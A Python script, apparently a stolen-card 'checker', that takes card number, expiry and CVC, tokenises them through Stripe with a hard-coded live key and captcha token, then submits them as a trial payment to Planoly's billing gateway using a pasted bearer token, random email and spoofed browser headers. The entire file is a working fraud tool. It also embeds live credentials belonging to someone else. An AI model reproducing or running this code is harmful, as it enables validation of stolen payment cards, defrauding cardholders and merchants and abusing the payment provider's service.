import requests
import user_agent
import random
import time
def Tele(ccx):
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = str(ccx.split("|")[2][2:])
		cvc = ccx.split("|")[3]
		user = str(user_agent.generate_user_agent)
		emil = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20)) + '@gmail.com'
		
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
		data = f'guid=cfc821c3-2efd-4934-a0bf-57099469bd617b6242&muid=321cfcd4-3cc8-4e37-9aff-f7a524636d3aeee8d8&sid=191b29aa-1bbb-479c-85c5-fd734d06185cc81f05&referrer=https%3A%2F%2Fbilling.planoly.com&time_on_page=64077&card[name]=g88yhj77%40gmail.com&card[address_zip]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZCTteFV-kvGWfBXVcifPHHELPXdOMHwOzxx9pKjUZ7_yHHm41aeLLC9SyzWvMktBJgTc5UIKP9dAN84D5FvWypvGSivLv_zNC7RCQ8s9gKCN79E4hpXzIoqy5p0GYx2CI3RrDPRdVIrjqpPlU5b-y3CXA8IN9wMEL9qYykqx6m0_AY-mVF_TEHqLroUN6qAA6udzwPUC1DLQRxmL49comQqLg52Fqf1yhdHIDQdb35fmKd9y4PmV73MhiaKywPKRshgtZwqzUL4x7faiVZ17TL6yOoHmigtXCqmIUe1u-NWFkpphe6PRzMW-SBtfTX3bVN2gBH8OQs7dWve9ZjvzQ_ov9An5RYZmm6_F5pMjU6oN71dGnxhs399hdaHpAanBOaG8kngInJG6zwC65f4kfXcF9_31HNF2EdfGj3CteT747WPw0OBIwj0-tWju6VM2Dg1oz9dWqstvd25z54_sQitBvMNR7naeqGTZc_4pMDskrXO_645T2OcbtE9wk23tN9qRYHv2Def2NFWHdAk0kXp3qDQIXv0SsntgPB9z3a5rj2R_wPG016idjczvseGn7T6E9wLEtk241y3HSYDV_YjILUZBQkjhEJddY9klmltAhwhW1GcNLP1EP27C5ce4TzP3vAabaIqGtlEdS3PX6GocgH0DcuTMuAPg50Gbe-PTa6K-YUEzPs2Sc5pO7Q83TFtFpSta67-ltueYt9gnWLYNRXEpGS-FKLckyzWZ9RVqGMtb5D7dpx8-ai4099NM_j1gpGOxoPYvSR5djCZD3bk5AEnXKqf73LX6GM6r4tc6hdMYJQJDfOFQCs5Mb15IcHCC3xKhL8pGTrv3fjIJZ-t02yMJA2ii8Y9FLS9Sj8N6u0Kq2Q9tXmZ2bVweUkldh6IfWOhabLyj_CPF5gazBi-hP-UVxraNG91Big6SRzVUPhAsgswcvXSKcH3jhrQKBc1ZV0168IAQ0fRMZSslXrM72SW1TUKVrf6NXm3kKFJgv0RV5xpqJdjLyrwuK0qyy7n3bIjqZ378gp6KeXXTtPplGri2ZkWI7vXrdPx84kcKCMz9p-5WRqMyMbM9Pjiw3IxSThCjdVLm350SyHemyP_UM6oEim4CJqsq6-iNaHILmcCKUfdE8fMSfwIKoh7OFYugrX-pGEinb3AXf2K0vMLV5tCLFBOuHZRSx5-pUK2aPM6lgUPJbzoJ01CXq-HkUWReOMnfkzHLGmsj9Xmynrr86GyJC3dhDaXegtY3ybxVjYn7cz_Jz4iD5BGXT_8x19m8urZGKForJOdZAS9oEhY6kAn22_SKTwY5uAhIF6pMJ9lc1IeDi0O4UAE3MTtNQ3jRWMBdkNBZ6b4QT0WxQM6srwUDD7DTjgwCe9NseV3p6ocmt_MJY53cAw77VNdohKTvgQmAtOYASk5Z0q573gvLvW8LHR2kuQOskp8r45_djKyRdl86E-8qj6SX5cF1msJH3BJC1bcZerDSc48n_9A-qU6L20M_XgmFv_P_QOTu49YlLRyo1qxUWUGls78LntuvlAn5Hu4k_Ujr-pcaW0Qr-Z1cyMg6Q1IOhVc2eAPNt749J4QdqLV6K_urvIszTgaVfYh7wgKAHzUsar1D4ryJGXMwN7sk_JTyNhrM6eAafniqhyFd_E22r0kjFvgIX_E9EByyP_jWUYUJCwRZpQVEi2e7eNP2qbza48S7_AxAS6jnvVBdl4q2uGL1A_NrnucVeXhXCQCuRsr_ntL_iDpV8JUMX-4M1tw0rqJddHWBzHbizaqeWZbwqAKiXCYsSF8RwTb5d7FbqceHKlp19aoSo3420XA48YdfCu-Azx1LIfr6rpp1IdNk6aN8rx3wJWXQBnQzyO0B3l478XzPbogio2GK8aYm2MeEiKbAxFMdtTdX5gHsmnNZCPYPvH-NSKGkSOfpufwf_PMA8Aye6IBEvpX3V2_BDSwj7QvdSXSnYOrKd45fuWWyjOpar43Jz7BIqfbn0DL1nDXmFHufqE_fIQkLq3mm73kemT4IIE337Byb4ppZL6dJc3ZDq7St9qoMbZGMp0L4hhTmspgXSXgZCs8ZJE-x-TRo4EUyH7EfCp6cjyt215wvTWFP_l4mSqhzMh8ekDr1b-RHFviEBnWBJYo2V4cM5mgmttqHNoYXJkX2lkzgMxg2-ia3KoMThlYWQ0NWOicGQA.TRqatIkL4XS6259s_vLpVP7I_UM7moM6t1wk1pOARY0&payment_user_agent=stripe.js%2F97cb06c5c7%3B+stripe-js-v3%2F97cb06c5c7%3B+split-card-element&key=pk_live_3umV2IkgIrB7KnLJZCuvwIp8'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		
		idd = response.json()['id']
		
		headers = {
		    'authority': 'gateway.planoly.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXUyJ9.eyJleHAiOjE3MTk5MDk0MTQsInVzZXJuYW1lIjoiN2VmZWIyNzI1NzZlZWE4MWUxYTNhYmUwY2U3N2VhZGMiLCJpYXQiOiIxNzE5ODIzMDE0In0.XTj1n2fbRhzQT5NN2MS3gyvZhikTUnQutq1DN4M37R6Xj_9BPDrxjv-3vyR9iUKYSG_ZMCJhk8vSlL1ghxoAkenCPAj0xdQs6RaU5Klow_CfaNBgHkzSPger1tyOf36H00tSg7WrLaZKOPiK57KUu0peqCbIhXH31yAMY3a8pk3ai_3TTioI-aYunh9m7pt9fcNG3a6Ok3liuxFOjhRxfz3JkTyyiVKL-0PW9scCuXx6eXvEubJwZXiJqpssyiEazej2cMLL3nuG4lB0Ctm5HgyXGSI0e5I-17D6NFN00i6LA4N13Pxwxox9x30N7e3Yg6LFGBmSB3jwUPSqndrEEVZM8QFth9dtu6dxwtA-BGVpQyONH4LXtrbySR9JDaqbZxVBleOQH0hOY0fNTtOgJmRLGzt6qWeoBk3rPwccfOR7Y2EesPauBEPElxXMiPxeb1ABCjUWvmQZ2g2zhg-7uE5BPEsoa_4YiKyqZIgoc6xr2j0gM0qcASVPBz7E8iXTEIhLWrvyJAwFfuXbJFn1N-C5-Ppu2Xrkdr8o0hGm7eHcHFi7xFUHJFVjWL10NsHVm46No_OAgAJeAKX9W-DQ9dugg1Vs_5tUnu0K2LquV4qTiedxbnQRBxG8SfGV6ZjVB-iy7aYiksMOtqTNJi4lXOMgE9JZTQKznDSywoGvh4s',
		    'content-type': 'application/json',
		    'origin': 'https://billing.planoly.com',
		    'referer': 'https://billing.planoly.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
		json_data = {
		    'variables': {
		        'payment': {
		            'name': emil,
		            'plans': [
		                {
		                    'id': 1811,
		                    'memberLimit': 1,
		                    'accountLimit': 0,
		                    'setLimit': 1,
		                },
		            ],
		            'stripeToken': idd,
		            'zipCode': '10080',
		            'trial': True,
		        },
		    },
		    'query': 'mutation ($payment: PaymentInput) {\n  pay(payment: $payment) {\n    id\n    __typename\n  }\n}\n',
		}
		
		response = requests.post('https://gateway.planoly.com/', headers=headers, json=json_data)
		
		try:
			ii=(response.text)
		except:
			return 'error'
		return ii
		